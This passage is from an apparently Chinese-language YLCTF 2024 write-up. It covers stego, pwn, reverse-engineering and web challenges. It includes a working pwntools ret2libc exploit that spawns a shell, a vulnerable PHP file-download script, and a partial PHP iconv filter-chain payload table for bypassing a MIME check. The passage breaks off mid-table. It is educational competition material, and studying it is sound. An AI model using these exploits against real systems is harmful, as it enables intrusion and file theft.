</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>except</span> <span style=color:#a6e22e>EOFError</span>:
</span></span><span style=display:flex><span>                print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;Connection closed unexpectedly in round </span><span style=color:#e6db74>{</span>i <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span><span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>break</span>
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>except</span> <span style=color:#a6e22e>Exception</span> <span style=color:#66d9ef>as</span> e:
</span></span><span style=display:flex><span>                print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;Error in round </span><span style=color:#e6db74>{</span>i <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span><span style=color:#e6db74>}</span><span style=color:#e6db74>: </span><span style=color:#e6db74>{</span>str(e)<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>break</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        final_data <span style=color:#f92672>=</span> p<span style=color:#f92672>.</span>recvall(timeout<span style=color:#f92672>=</span><span style=color:#ae81ff>5</span>)
</span></span><span style=display:flex><span>        print(<span style=color:#e6db74>&#34;Final server response:&#34;</span>, final_data<span style=color:#f92672>.</span>decode())
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        predicted_string <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;&#39;</span><span style=color:#f92672>.</span>join(map(str, predictions))
</span></span><span style=display:flex><span>        print(<span style=color:#e6db74>&#34;All predicted digits as a string:&#34;</span>, predicted_string)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>except</span> <span style=color:#a6e22e>Exception</span> <span style=color:#66d9ef>as</span> e:
</span></span><span style=display:flex><span>        print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;An error occurred: </span><span style=color:#e6db74>{</span>str(e)<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>finally</span>:
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> <span style=color:#e6db74>&#39;p&#39;</span> <span style=color:#f92672>in</span> locals():
</span></span><span style=display:flex><span>            p<span style=color:#f92672>.</span>close()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> __name__ <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;__main__&#34;</span>:
</span></span><span style=display:flex><span>    main()
</span></span></code></pre></div><h5 id=round-2-trace>[Round 2] Trace</h5><p>图片用010打开发现后面一大段有base64编码，去赛博转换一下得到一个rar文件，PassFabforRAR解密一下，得到密码370950解密得到里面的图片</p><img src=../../images/ylctf/2024/test.png alt=test style=zoom:50%><p>仔细在记事本上研究了一会拼出了flag</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-markdown data-lang=markdown><span style=display:flex><span>YLCTF{ccfe9e2c-391f-4055-a128-c06b65426c83}
</span></span></code></pre></div><h4 id=pwn-1>Pwn</h4><h5 id=round-2-ezstack2>[Round 2] ezstack2</h5><p>有nx保护</p><p>ida看，stack里有栈溢出，vuln里有判断执行system(“sh”)。</p><p><img alt=stack1 loading=lazy src=/posts/ctf/ylctf2024/stack1.png></p><p>通过read栈溢出触发puts函数的调用，并通过GOT地址泄露libc的地址.</p><p>使用ROPgadget获取pop_rdi和ret地址,通过read栈溢出触发puts函数的调用，并通过GOT地址泄露libc地址,最后泄露libc地址和执行system</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>from</span> pwn <span style=color:#f92672>import</span> <span style=color:#f92672>*</span>
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> LibcSearcher <span style=color:#f92672>import</span> <span style=color:#f92672>*</span>
</span></span><span style=display:flex><span>p <span style=color:#f92672>=</span> remote(<span style=color:#e6db74>&#39;challenge.yuanloo.com&#39;</span>, <span style=color:#ae81ff>25160</span>)
</span></span><span style=display:flex><span>elf <span style=color:#f92672>=</span> ELF(<span style=color:#e6db74>&#39;./pwn&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>rdi <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x400823</span>
</span></span><span style=display:flex><span>main <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x40070A</span>
</span></span><span style=display:flex><span>puts_plt <span style=color:#f92672>=</span> elf<span style=color:#f92672>.</span>plt[<span style=color:#e6db74>&#39;puts&#39;</span>]
</span></span><span style=display:flex><span>puts_got <span style=color:#f92672>=</span> elf<span style=color:#f92672>.</span>got[<span style=color:#e6db74>&#39;puts&#39;</span>]
</span></span><span style=display:flex><span>payload1 <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;a&#39;</span> <span style=color:#f92672>*</span> (<span style=color:#ae81ff>0x30</span> <span style=color:#f92672>+</span> <span style=color:#ae81ff>8</span>) <span style=color:#f92672>+</span> p64(rdi) <span style=color:#f92672>+</span> p64(puts_got) <span style=color:#f92672>+</span> p64(puts_plt) <span style=color:#f92672>+</span> p64(main)
</span></span><span style=display:flex><span>p<span style=color:#f92672>.</span>sendline(payload1)
</span></span><span style=display:flex><span>puts_addr <span style=color:#f92672>=</span> u64(p<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\x7f</span><span style=color:#e6db74>&#39;</span>)[<span style=color:#f92672>-</span><span style=color:#ae81ff>6</span>:]<span style=color:#f92672>.</span>ljust(<span style=color:#ae81ff>8</span>, <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\x00</span><span style=color:#e6db74>&#39;</span>))
</span></span><span style=display:flex><span>libc <span style=color:#f92672>=</span> LibcSearcher(<span style=color:#e6db74>&#39;puts&#39;</span>, puts_addr)
</span></span><span style=display:flex><span>libcbase <span style=color:#f92672>=</span> puts_addr <span style=color:#f92672>-</span> libc<span style=color:#f92672>.</span>dump(<span style=color:#e6db74>&#39;puts&#39;</span>)
</span></span><span style=display:flex><span>sys <span style=color:#f92672>=</span> libcbase <span style=color:#f92672>+</span> libc<span style=color:#f92672>.</span>dump(<span style=color:#e6db74>&#39;system&#39;</span>)
</span></span><span style=display:flex><span>binsh <span style=color:#f92672>=</span> libcbase <span style=color:#f92672>+</span> libc<span style=color:#f92672>.</span>dump(<span style=color:#e6db74>&#39;str_bin_sh&#39;</span>)
</span></span><span style=display:flex><span>payload2 <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;a&#39;</span> <span style=color:#f92672>*</span> (<span style=color:#ae81ff>0x30</span> <span style=color:#f92672>+</span> <span style=color:#ae81ff>8</span>) <span style=color:#f92672>+</span> p64(<span style=color:#ae81ff>0x40056e</span>) <span style=color:#f92672>+</span> p64(rdi) <span style=color:#f92672>+</span> p64(binsh) <span style=color:#f92672>+</span> p64(sys)
</span></span><span style=display:flex><span>p<span style=color:#f92672>.</span>sendline(payload2)
</span></span><span style=display:flex><span>p<span style=color:#f92672>.</span>interactive()
</span></span></code></pre></div><p><img alt=stack2 loading=lazy src=/posts/ctf/ylctf2024/stack2.png></p><h4 id=re-1>Re</h4><h5 id=round-2-三点几啦饮茶先>[Round 2] 三点几啦饮茶先</h5><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>decipher</span>(v, k):
</span></span><span style=display:flex><span>    v0, v1 <span style=color:#f92672>=</span> v
</span></span><span style=display:flex><span>    sum <span style=color:#f92672>=</span> (<span style=color:#ae81ff>289739961</span> <span style=color:#f92672>*</span> <span style=color:#ae81ff>40</span>) <span style=color:#f92672>&amp;</span> <span style=color:#ae81ff>0xffffffff</span>  <span style=color:#75715e># Initial sum value</span>
</span></span><span style=display:flex><span>    delta <span style=color:#f92672>=</span> <span style=color:#ae81ff>289739961</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>40</span>):
</span></span><span style=display:flex><span>        v1 <span style=color:#f92672>-=</span> (((v0 <span style=color:#f92672>&gt;&gt;</span> <span style=color:#ae81ff>5</span>) <span style=color:#f92672>^</span> (<span style=color:#ae81ff>16</span> <span style=color:#f92672>*</span> v0)) <span style=color:#f92672>+</span> v0) <span style=color:#f92672>^</span> (k[(sum <span style=color:#f92672>&gt;&gt;</span> <span style=color:#ae81ff>11</span>) <span style=color:#f92672>&amp;</span> <span style=color:#ae81ff>3</span>] <span style=color:#f92672>+</span> sum)
</span></span><span style=display:flex><span>        v1 <span style=color:#f92672>&amp;=</span> <span style=color:#ae81ff>0xffffffff</span>
</span></span><span style=display:flex><span>        sum <span style=color:#f92672>-=</span> delta
</span></span><span style=display:flex><span>        sum <span style=color:#f92672>&amp;=</span> <span style=color:#ae81ff>0xffffffff</span>
</span></span><span style=display:flex><span>        v0 <span style=color:#f92672>-=</span> (((v1 <span style=color:#f92672>&gt;&gt;</span> <span style=color:#ae81ff>3</span>) <span style=color:#f92672>^</span> (<span style=color:#ae81ff>4</span> <span style=color:#f92672>*</span> v1)) <span style=color:#f92672>+</span> v1) <span style=color:#f92672>^</span> (k[sum <span style=color:#f92672>&amp;</span> <span style=color:#ae81ff>3</span>] <span style=color:#f92672>+</span> sum)
</span></span><span style=display:flex><span>        v0 <span style=color:#f92672>&amp;=</span> <span style=color:#ae81ff>0xffffffff</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> [v0, v1]
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># 目标密文</span>
</span></span><span style=display:flex><span>target_v0 <span style=color:#f92672>=</span> <span style=color:#ae81ff>1913208188</span>
</span></span><span style=display:flex><span>target_v1 <span style=color:#f92672>=</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>1240730499</span> <span style=color:#f92672>&amp;</span> <span style=color:#ae81ff>0xffffffff</span>  <span style=color:#75715e># 转换为无符号整数</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># 密钥</span>
</span></span><span style=display:flex><span>key <span style=color:#f92672>=</span> [<span style=color:#ae81ff>4097</span>, <span style=color:#ae81ff>8194</span>, <span style=color:#ae81ff>12291</span>, <span style=color:#ae81ff>16388</span>]
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># 解密</span>
</span></span><span style=display:flex><span>decrypted <span style=color:#f92672>=</span> decipher([target_v0, target_v1], key)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;解密结果: </span><span style=color:#e6db74>{</span>decrypted<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;输入的两个标签应该是: </span><span style=color:#e6db74>{</span>decrypted[<span style=color:#ae81ff>0</span>]<span style=color:#e6db74>}</span><span style=color:#e6db74> 和 </span><span style=color:#e6db74>{</span>decrypted[<span style=color:#ae81ff>1</span>]<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
</span></span></code></pre></div><h5 id=round-2-ezwasm>[Round 2] ezwasm</h5><p><img alt=wasm loading=lazy src=/posts/ctf/ylctf2024/wasm.png></p><p>外部改成大写即可</p><h4 id=web-1>Web</h4><h5 id=round-2-cmnts>[Round 2] Cmnts</h5><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-markdown data-lang=markdown><span style=display:flex><span>Z2V0X3RoMXNfZjFhZy5waHA=  #get_th1s_f1ag.php
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-markdown data-lang=markdown><span style=display:flex><span>?key=a7a795a8efb7c30151031c2cb700ddd9
</span></span></code></pre></div><p>变量覆盖</p><h5 id=round-2-pseudo复现>[Round 2] Pseudo(复现)</h5><p>可以看到给的附件里面的下载的php文件</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>error_reporting</span>(<span style=color:#ae81ff>0</span>);
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>isset</span>($_GET[<span style=color:#e6db74>&#39;file&#39;</span>])) {
</span></span><span style=display:flex><span>    $data <span style=color:#f92672>=</span> <span style=color:#a6e22e>file_get_contents</span>($_GET[<span style=color:#e6db74>&#39;file&#39;</span>]);
</span></span><span style=display:flex><span>    $file <span style=color:#f92672>=</span> <span style=color:#a6e22e>tmpfile</span>();
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>fwrite</span>($file, $data);
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>fflush</span>($file);
</span></span><span style=display:flex><span>    $type <span style=color:#f92672>=</span> <span style=color:#a6e22e>mime_content_type</span>(<span style=color:#a6e22e>stream_get_meta_data</span>($file)[<span style=color:#e6db74>&#39;uri&#39;</span>]);
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>fclose</span>($file);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span><span style=color:#a6e22e>in_array</span>($type,[<span style=color:#e6db74>&#39;image/jpg&#39;</span>,<span style=color:#e6db74>&#39;image/jpeg&#39;</span>, <span style=color:#e6db74>&#39;image/png&#39;</span>, <span style=color:#e6db74>&#39;image/gif&#39;</span>])) {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;error!!!&#34;</span>;
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>exit</span>;
</span></span><span style=display:flex><span>    }<span style=color:#66d9ef>else</span>{
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>header</span>(<span style=color:#e6db74>&#39;Content-Description: File Transfer&#39;</span>);
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>header</span>(<span style=color:#e6db74>&#39;Content-Type: application/octet-stream&#39;</span>);
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>header</span>(<span style=color:#e6db74>&#39;Content-Disposition: attachment; filename=&#34;download.jpg&#34;&#39;</span>);
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>header</span>(<span style=color:#e6db74>&#39;Expires: 0&#39;</span>);
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>header</span>(<span style=color:#e6db74>&#39;Cache-Control: must-revalidate&#39;</span>);
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>header</span>(<span style=color:#e6db74>&#39;Pragma: public&#39;</span>);
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>echo</span>($data);
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>exit</span>;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>可以利用这里的函数漏洞得到flag，关键点是需要绕过<code>mime_content_type</code>函数，可以利用filterchain进行绕过得到flag</p><p>下面是脚本，或者用GitHub上面的脚本</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span>$base64_payload <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;R0lGODlB&#34;</span>; <span style=color:#75715e>/*GIF89A*/</span>
</span></span><span style=display:flex><span>$conversions <span style=color:#f92672>=</span> <span style=color:#66d9ef>array</span>(
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;/&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4&#39;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;0&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.1046.UCS2&#39;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;1&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4&#39;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;2&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP949.UTF32BE|convert.iconv.ISO_69372.CSIBM921&#39;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;3&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE&#39;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;4&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.IEC_P271.UCS2&#39;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;5&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.GBK.UTF-8|convert.iconv.IEC_P27-1.UCS-4LE&#39;</span>,
</span></span><span style=display:flex><span>	<span style=color:#e6db74>&#39;6&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;convert.iconv.UTF-8.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.CSIBM943.UCS4|convert.iconv.IBM866.UCS-2&#39;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;7&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.866.UCS2&#39;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;8&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2&#39;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;9&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.ISO6937.JOHAB&#39;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;A&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213&#39;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;B&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.CP1256.UCS2&#39;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;C&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;convert.iconv.UTF8.CSISO2022KR&#39;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;D&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2&#39;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;E&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;convert.iconv.IBM860.UTF16|convert.iconv.ISO-IR-143.ISO2022CNEXT&#39;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;F&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB&#39;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;G&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90&#39;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;H&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213&#39;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;I&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213&#39;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;J&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4&#39;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;K&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE&#39;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;L&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.R9.ISO6937|convert.iconv.OSF00010100.UHC&#39;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;M&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.iconv.UTF16BE.866|convert.iconv.MACUKRAINIAN.WCHAR_T&#39;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;N&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4&#39;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;O&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775&#39;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;P&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB&#39;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;Q&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2&#39;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;R&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4&#39;</span>,
</span></span><span style=display:flex><span>	<span style=color:#e6db74>&#39;S&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;convert.iconv.UTF-8.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.SJIS&#39;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;T&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500.L4|convert.iconv.ISO_8859-2.ISO-IR-103&#39;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;U&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.CP1133.IBM932&#39;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;V&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB&#39;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;W&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936&#39;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;X&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932&#39;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;Y&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361&#39;</span>,
</span></span><span style=display:flex><span>	<span style=color:#e6db74>&#39;Z&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16&#39;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;a&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE&#39;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;b&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE&#39;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;c&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2&#39;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;d&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UJIS|convert.iconv.852.UCS2&#39;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;e&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UTF16.EUC-JP-MS|convert.iconv.ISO-8859-1.ISO_6937&#39;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;f&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213&#39;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;g&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8&#39;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;h&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE&#39;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;i&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000&#39;</span>,
